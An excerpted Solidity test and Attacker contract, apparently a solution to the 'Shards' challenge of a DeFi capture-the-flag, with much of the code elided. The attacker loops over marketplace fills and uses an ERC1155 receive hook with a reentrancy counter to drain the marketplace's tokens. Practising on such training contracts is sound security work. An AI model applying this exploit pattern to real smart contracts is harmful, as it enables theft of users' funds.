...
contract ShardsChallenge is Test {
    ...
    function test_shards() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(marketplace);
        console.log("marketplace token balance", initialTokensInMarketplace);
...
contract Attacker {
    ...
    uint256 public constant SHARDS_TO_BUY = 133;
    uint256 public constant REENTRANCY_LIMIT = 10_000_000e18 / SHARDS_TO_BUY;
    uint256 public reentrancyCount = 0;
    DamnValuableToken token;

    constructor(ShardsNFTMarketplace _marketplace) {
    ...
    function attack() public {
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(1, SHARDS_TO_BUY);
    ...
    function onERC1155Received(
        ...
        if (reentrancyCount >= REENTRANCY_LIMIT) {
